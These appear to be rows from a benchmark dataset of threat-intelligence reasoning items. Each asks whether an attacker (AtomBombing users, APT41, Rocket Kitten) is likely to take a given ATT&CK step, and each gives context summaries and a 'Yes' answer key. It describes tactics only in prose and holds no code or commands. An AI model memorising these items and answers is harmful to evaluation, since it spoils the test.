2910,96,96-Execution-T1106-Native API,"After threat actors use AtomBombing to leverage Windows operating system mechanisms for malicious code injection and execute it via legitimate programs, is it likely that they will bypass antivirus (AV), next-generation antivirus (NGAV), and endpoint infiltration prevention solutions as part of their defense evasion strategy?","Execution: On October 27, 2016, Tal Liberman authored a report revealing a new code injection technique called AtomBombing, which leverages the underlying Windows operating system mechanisms to inject malicious code and bypass security solutions. This technique affects all versions of Windows, including Windows 10, and cannot be patched as it relies on the operating system's design rather than a flaw. AtomBombing exploits atom tables, allowing threat actors to write malicious code into an atom table and manipulate legitimate programs to execute it. This technique is particularly concerning as it can bypass antivirus (AV), next-generation antivirus (NGAV), and other endpoint infiltration prevention solutions.","Defense Evasion: The AtomBombing technique enables threat actors to bypass process-level restrictions by injecting malicious code into trusted processes, thereby evading security products. It also allows attackers to access context-specific data, such as screenshots, perform Man in the Browser (MitB) attacks, and access encrypted passwords. AtomBombing is a significant concern for security solutions as it does not require exploiting operating system bugs or vulnerabilities and cannot be fixed with a patch. Security products must monitor API calls for malicious activity to mitigate this technique.",Yes,AtomBombing_ A Code Injection that Bypasses Current Security Solutions
2918,98,98-Defense Evasion-T1542-Pre-OS Boot,"Before leveraging malware such as credential stealers and keyloggers to access compromised systems, is it likely that APT41 will deploy Master Boot Record (MBR) bootkits to maintain persistence while using bootkits for pre-operating system execution as an added layer of stealth for defense evasion?","Defense Evasion: APT41 uses bootkits for defense evasion, which are executed prior to the operating system initializing, adding an extra layer of stealth.","Reconnaissance: APT41 has conducted reconnaissance activities, targeting call record information at telecom companies and hotel reservation systems, particularly ahead of Chinese officials' stays, suggesting tasks to reconnoiter facilities for security reasons.
Initial Access: APT41 has utilized spear-phishing emails with attachments, such as compiled HTML (.chm) files, to initially compromise victim organizations.
Execution: APT41 deploys a variety of malware, including backdoors, credential stealers, keyloggers, and rootkits, to execute their operations within compromised systems.
Persistence: APT41 has deployed rootkits and Master Boot Record (MBR) bootkits to maintain persistence on select victim systems, with bootkits adding stealth by executing before the operating system initializes.
Credential Access: APT41 uses malware such as credential stealers and keyloggers to access credentials within compromised systems.
Discovery: APT41 is adept at moving laterally within networks, including pivoting between Windows and Linux systems, to discover and access game production environments.
Lateral Movement: APT41 moves laterally within targeted networks, including pivoting between Windows and Linux systems, until accessing game production environments.
Collection: APT41 collects source code and digital certificates from game production environments.
Impact: APT41 manipulates virtual currencies and has attempted to deploy ransomware in the video game industry for financial gain.
Others: APT41 is a Chinese cyber threat group involved in state-sponsored espionage and financially motivated operations since 2014. They are known for supply chain compromise tactics, limiting malware deployment to specific systems, and using non-public malware typically reserved for espionage in financially motivated activities. APT41's malware arsenal includes over 46 different families and tools, and they have been linked to Chinese espionage contractors advertising their services online. The group's activities suggest a blurred line between state power and crime.",Yes,blog_APT41
2922,98,98-Collection-T1213-Data from Information Repositories,"After moving laterally within targeted networks and accessing game production environments, is it likely that APT41 collects source code and digital certificates from those environments in alignment with their objective of attaining valuable assets?",Collection: APT41 collects source code and digital certificates from game production environments.,"Reconnaissance: APT41 has conducted reconnaissance activities, targeting call record information at telecom companies and hotel reservation systems, particularly ahead of Chinese officials' stays, suggesting tasks to reconnoiter facilities for security reasons.
Initial Access: APT41 has utilized spear-phishing emails with attachments, such as compiled HTML (.chm) files, to initially compromise victim organizations.
Execution: APT41 deploys a variety of malware, including backdoors, credential stealers, keyloggers, and rootkits, to execute their operations within compromised systems.
Persistence: APT41 has deployed rootkits and Master Boot Record (MBR) bootkits to maintain persistence on select victim systems, with bootkits adding stealth by executing before the operating system initializes.
Defense Evasion: APT41 uses bootkits for defense evasion, which are executed prior to the operating system initializing, adding an extra layer of stealth.
Credential Access: APT41 uses malware such as credential stealers and keyloggers to access credentials within compromised systems.
Discovery: APT41 is adept at moving laterally within networks, including pivoting between Windows and Linux systems, to discover and access game production environments.
Lateral Movement: APT41 moves laterally within targeted networks, including pivoting between Windows and Linux systems, until accessing game production environments.
Impact: APT41 manipulates virtual currencies and has attempted to deploy ransomware in the video game industry for financial gain.
Others: APT41 is a Chinese cyber threat group involved in state-sponsored espionage and financially motivated operations since 2014. They are known for supply chain compromise tactics, limiting malware deployment to specific systems, and using non-public malware typically reserved for espionage in financially motivated activities. APT41's malware arsenal includes over 46 different families and tools, and they have been linked to Chinese espionage contractors advertising their services online. The group's activities suggest a blurred line between state power and crime.",Yes,blog_APT41
2929,99,99-Command and Control-T1105-Ingress Tool Transfer,"After employing a VBScript named 'wsc.vbs' for persistence and creating a mutex called 'woolger' to establish defense evasion mechanisms, is it likely that GHOLE malware will communicate with its C&C servers and the CWoolger keylogger will upload keystroke logs exceeding 3,000 bytes to C&C servers?","Command and Control: GHOLE malware communicated directly with C&C servers using hard-coded IP addresses. The malware sent GET requests to the server with a specific pattern, and other communication patterns were identified as indicators of compromise. The CWoolger keylogger would upload keystroke logs to the C&C server at specific intervals if the log file exceeded 3,000 bytes.","Initial Access: The Rocket Kitten group utilized spear-phishing emails as the initial access vector to penetrate target systems. The emails contained attachments with malicious macros or links leading to Microsoft OneDrive where malicious files were hosted. Notably, a file named 'Iran's Missiles Program.ppt.exe' was stored on OneDrive to bypass email detection. This executable, disguised with a PowerPoint icon, would drop a nonmalicious decoy PowerPoint file while silently infecting the system with the CWoolger keylogger.
Defense Evasion: The GHOLE malware campaign employed a .DLL file with an export function named 'function' instead of 'gholee' to evade detection. The malware also used hard-coded IP addresses for C&C communication, avoiding domain names to bypass network defenses. Additionally, the CWoolger keylogger created a mutex called 'woolger' and a VBScript named 'wsc.vbs' to establish persistence mechanisms, such as a startup folder entry with a Notepad icon.
Others: The Rocket Kitten group's campaigns targeted various organizations, including defense, IT, government, and academic entities, primarily in Israel and Europe. The GHOLE malware is a modified version of the CORE IMPACT penetration-testing tool. Metadata analysis of malicious files revealed authors such as Wool3n.H4t, aikido1, and Hoffman. Wool3n.H4t, who is likely part of the threat actor group, was also found to be a malware developer responsible for the CWoolger keylogger. The group's activities suggest a state-sponsored campaign with interests aligned with the Islamic Republic of Iran.",Yes,wp-operation-woolen-goldfish
